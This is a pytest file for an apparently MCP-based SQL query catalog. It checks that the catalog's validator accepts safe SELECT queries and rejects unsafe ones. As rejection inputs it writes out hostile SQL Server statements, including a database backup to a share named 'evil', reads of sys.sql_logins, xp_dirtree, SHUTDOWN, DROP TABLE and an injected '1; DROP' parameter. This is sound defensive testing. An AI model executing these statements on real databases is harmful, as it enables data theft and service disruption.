from __future__ import annotations

import datetime as dt
from pathlib import Path

import pytest
from conftest import TEMPLATE_CATALOG, write_sql

from plm_db_mcp.catalog import (
    CatalogError,
    load_catalog,
    load_query_file,
    parse_query,
    validate_params,
)

BASE = """
name: q
description: d
when_to_use: w
"""
WITH_PARAM = (
    BASE
    + """
params:
  item:
    type: str
"""
)


def sql(header: str, body: str) -> str:
    return f"/* ---\n{header.strip()}\n--- */\n{body}\n"


def test_template_examples_all_load():
    files = sorted(TEMPLATE_CATALOG.glob("*.sql"))
    assert files, "instance-template/catalog has no example .sql"
    names = {load_query_file(p).name for p in files}
    assert len(names) == len(files)


def test_header_defaults_and_param_mapping():
    q = parse_query(sql(WITH_PARAM, "SELECT * FROM DEMO_ITEM WHERE N = @item"), Path("q.sql"))
    assert (q.max_rows, q.timeout_s, q.isolation) == (50, 15, "read_committed")
    assert q.sql == "SELECT * FROM DEMO_ITEM WHERE N = %(item)s"
    assert q.params["item"].required is True


def test_full_header():
    header = (
        BASE
        + """
params:
  kind: {type: enum, values: [A, B], required: false}
max_rows: 500
timeout_s: 60
isolation: read_uncommitted
"""
    )
    q = parse_query(
        sql(header, "WITH x AS (SELECT 1 AS v) SELECT v FROM x WHERE @kind IS NULL;"), Path("q.sql")
    )
    assert (q.max_rows, q.timeout_s, q.isolation) == (500, 60, "read_uncommitted")
    assert q.describe()["params"]["kind"]["values"] == ["A", "B"]


def test_strings_comments_and_sysvars_are_not_rewritten():
    body = (
        "SELECT '@item; DELETE', [UPDATE], @@ROWCOUNT -- EXEC @nope\n"
        "/* DROP TABLE x; */ FROM T WHERE a = @item AND b LIKE 'A%'"
    )
    q = parse_query(sql(WITH_PARAM, body), Path("q.sql"))
    assert "'@item; DELETE'" in q.sql
    assert "-- EXEC @nope" in q.sql
    assert "@@ROWCOUNT" in q.sql
    assert q.sql.endswith("a = %(item)s AND b LIKE 'A%'")


@pytest.mark.parametrize(
    ("header", "body", "message"),
    [
        (BASE, "SELECT @x", "undeclared variable"),
        (WITH_PARAM, "SELECT 1", "declared but unused"),
        (BASE, "SELECT 1; SELECT 2", "multiple statements"),
        (BASE, "UPDATE T SET a = 1", "must start with SELECT or WITH"),
        (BASE, "EXEC sp_who", "must start with SELECT or WITH"),
        (BASE, "SELECT * INTO T2 FROM T", "forbidden keyword `INTO`"),
        (BASE, "SELECT 1 WAITFOR DELAY '00:00:10'", "forbidden keyword `WAITFOR`"),
        (BASE, "SELECT * FROM OPENROWSET('x')", "forbidden keyword `OPENROWSET`"),
        (BASE, "WITH d AS (SELECT 1 a) DELETE FROM d", "forbidden keyword `DELETE`"),
        (BASE, "SELECT 1 FROM T; DROP TABLE T", "multiple statements"),
        (BASE, "SELECT '%(x)s'", "literal `%(`"),
        (BASE + "max_rows: 501", "SELECT 1", "max_rows"),
        (BASE + "timeout_s: 0", "SELECT 1", "timeout_s"),
        (BASE + "isolation: serializable", "SELECT 1", "isolation"),
        (BASE + "extra: 1", "SELECT 1", "unknown header keys"),
        ("name: q\ndescription: d", "SELECT 1", "when_to_use"),
        (BASE.replace("name: q", "name: Bad-Name"), "SELECT 1", "invalid query name"),
        (BASE + "params:\n  p: {type: float}", "SELECT @p", "type must be one of"),
        (BASE + "params:\n  p: {type: enum}", "SELECT @p", "enum needs"),
        (BASE + "params:\n  p: {type: int, max_len: 3}", "SELECT @p", "apply only to type str"),
        (BASE + "params:\n  p: {type: str, pattern: '('}", "SELECT @p", "invalid pattern"),
        (BASE + "params:\n  p: {type: str, nope: 1}", "SELECT @p", "unknown keys"),
    ],
)
def test_rejections(header, body, message):
    with pytest.raises(CatalogError, match=message.replace("(", r"\(")):
        parse_query(sql(header, body), Path("q.sql"))


def test_missing_header_rejected():
    with pytest.raises(CatalogError, match="missing YAML header"):
        parse_query("SELECT 1", Path("q.sql"))


def test_load_catalog_skips_underscore_and_reports_errors(tmp_path):
    write_sql(tmp_path, "good.sql", BASE, "SELECT 1")
    write_sql(tmp_path, "_draft.sql", BASE, "DELETE FROM T")
    assert list(load_catalog(tmp_path)) == ["q"]
    write_sql(tmp_path, "dup.sql", BASE, "SELECT 2")
    write_sql(tmp_path, "bad.sql", BASE.replace("name: q", "name: b"), "DROP TABLE T")
    with pytest.raises(CatalogError) as exc:
        load_catalog(tmp_path)
    assert "bad.sql" in str(exc.value) and "duplicate query name" in str(exc.value)


def test_load_catalog_missing_dir(tmp_path):
    with pytest.raises(CatalogError, match="not found"):
        load_catalog(tmp_path / "nope")


PARAMS_HEADER = (
    BASE
    + """
params:
  n: {type: int}
  s: {type: str, max_len: 5, pattern: "[A-Z]+", required: false}
  d: {type: date, required: false}
  e: {type: enum, values: [X, Y], required: false}
"""
)
PARAMS_QUERY = parse_query(sql(PARAMS_HEADER, "SELECT @n, @s, @d, @e"), Path("q.sql"))


def test_param_validation_ok():
    out = validate_params(PARAMS_QUERY, {"n": "42", "s": "ABC", "d": "2026-01-31", "e": "Y"})
    assert out == {"n": 42, "s": "ABC", "d": dt.date(2026, 1, 31), "e": "Y"}
    assert validate_params(PARAMS_QUERY, {"n": 1}) == {"n": 1, "s": None, "d": None, "e": None}


@pytest.mark.parametrize(
    ("params", "message"),
    [
        ({}, "missing required parameter `n`"),
        ({"n": 1, "zz": 1}, "unknown parameters"),
        ({"n": True}, "must be an integer"),
        ({"n": "1; DROP"}, "must be an integer"),
        ({"n": 1, "s": "ABCDEF"}, "max_len"),
        ({"n": 1, "s": "abc"}, "pattern"),
        ({"n": 1, "s": 5}, "must be a string"),
        ({"n": 1, "d": "31/01/2026"}, "ISO date"),
        ({"n": 1, "d": "2026-02-30"}, "ISO date"),
        ({"n": 1, "e": "Z"}, "must be one of"),
    ],
)
def test_param_validation_errors(params, message):
    with pytest.raises(CatalogError, match=message):
        validate_params(PARAMS_QUERY, params)


P_HEADER = BASE + "params:\n  p: {type: str}"


@pytest.mark.parametrize(
    "body",
    [
        "SELECT @p SELECT name FROM sys.sql_logins",
        "SELECT @p BACKUP DATABASE x TO DISK='\\\\evil\\s'",
        "SELECT @p RESTORE DATABASE x FROM DISK='a'",
        "SELECT @p KILL 55",
        "SELECT @p SHUTDOWN WITH NOWAIT",
        "SELECT @p DBCC DROPCLEANBUFFERS",
        "SELECT @p DENY SELECT ON t TO public",
        "SELECT @p REVOKE SELECT ON t FROM public",
        "SELECT @p USE master",
        "SELECT @p SET LOCK_TIMEOUT -1",
        "SELECT @p BEGIN TRAN SELECT * FROM t WITH (TABLOCKX, HOLDLOCK)",
        "SELECT @p RAISERROR('x',16,1) WITH LOG",
        "SELECT @p THROW 50000, 'x', 1",
        "SELECT @p WRITETEXT t.c @@ROWCOUNT 'x'",
        "SELECT @p sp_executesql N'DROP TABLE t'",
        "SELECT @p, xp_dirtree('c:')",
        "SELECT @p PRINT 'x'",
        "SELECT @p COMMIT",
        "SELECT @p RECONFIGURE",
        "SELECT @p FROM t UNION SELECT 1 SELECT name FROM sys.sql_logins",
        "SELECT @p -- c\nSELECT name FROM sys.sql_logins",
        "SELECT @p, 'x' SELECT 2",
        "SELECT @p, (SELECT 1) SELECT 2",
        "WITH c AS (SELECT @p AS a) SELECT a FROM c SELECT 2",
        "SELECT @p FROM (SELECT 1 AS a",
        "WITH c AS (SELECT @p AS a) DELETE FROM c",
    ],
)
def test_second_statement_without_semicolon_rejected(body):
    with pytest.raises(CatalogError):
        parse_query(sql(P_HEADER, body), Path("q.sql"))


@pytest.mark.parametrize(
    "body",
    [
        "SELECT a FROM t WHERE b IN (SELECT b FROM u WHERE c = @p)",
        "SELECT a FROM t WHERE EXISTS (SELECT 1 FROM u WHERE u.a = t.a) AND b = @p",
        "WITH x AS (SELECT 1 AS v), y (w) AS (SELECT v FROM x) SELECT w FROM y WHERE @p IS NULL",
        "SELECT a FROM t WHERE b = @p UNION ALL SELECT a FROM u UNION SELECT 3",
        "SELECT a FROM t WHERE b = @p EXCEPT SELECT a FROM u INTERSECT SELECT a FROM v",
        "SELECT CASE WHEN a = @p THEN 'x' ELSE 'y' END AS k FROM t",
        "SELECT a, ROW_NUMBER() OVER (PARTITION BY b ORDER BY c DESC) AS rn FROM t WHERE d = @p",
        "SELECT TOP (10) a FROM t WHERE b = @p ORDER BY a",
        "SELECT a, (SELECT MAX(x) FROM u) AS m FROM t WHERE b = @p;",
        "SELECT a FROM t WITH (NOLOCK) WHERE b = @p OPTION (USE HINT('X'))",
        "SELECT [SET], [USE], 'BEGIN SELECT' AS s FROM t WHERE b = @p -- SELECT 2\n",
    ],
)
def test_legitimate_select_patterns_pass(body):
    parse_query(sql(P_HEADER, body), Path("q.sql"))
